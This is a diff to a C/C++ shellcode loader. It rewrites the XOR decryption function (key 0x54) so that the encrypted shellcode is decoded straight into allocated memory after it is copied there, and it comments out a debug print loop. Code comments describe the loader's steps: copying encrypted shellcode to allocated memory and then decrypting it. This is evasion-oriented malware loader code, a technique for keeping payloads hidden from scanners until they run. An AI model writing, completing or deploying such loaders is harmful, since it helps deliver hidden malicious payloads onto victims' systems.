@@ -12,18 +12,20 @@
 
 
 // This function will xor the payload with the key in order to decrypt it
-void decrypt_payload(unsigned char* payload, unsigned int payload_size, const unsigned char xor_key)
+void decrypt_payload(unsigned char* payload, unsigned char* memory, unsigned int payload_size, const unsigned char xor_key)
 {
     int j = 0;
 	for (unsigned int i = 0; i < payload_size-1; i+=3)
 	{
-        payload[j] = payload[i] ^ xor_key;
+        memory[j] = payload[i] ^ xor_key;
         //std::cout <<  std::hex <<int(payload[i]);
         j++;
 	}
+    /*
     for (unsigned int i = 0; i < (payload_size-1)/3; i+=1){
         std::cout <<  std::hex <<int(payload[i]);
     }
+    */
 }
 
 int main()
@@ -51,9 +53,6 @@ int main()
 	printf("Hit enter to continue\n");
 	getchar();
 #endif
-
-    const unsigned char key = '\x54';
-    decrypt_payload((unsigned char*) shellcode, sizeof(shellcode), key);
 	// Step 2 : Copy the encrypted shellcode to the allocated memory
 	memcpy(memory,
 		   shellcode,
@@ -64,7 +63,8 @@ int main()
 	printf("Hit enter to continue\n");
 	getchar();
 #endif
-
+    const unsigned char key = '\x54';
+    decrypt_payload((unsigned char*) shellcode, (unsigned char*) memory, sizeof(shellcode), key);
 #if DEBUG
 	printf("Shellcode decrypted\n");
 	printf("Hit enter to continue\n");
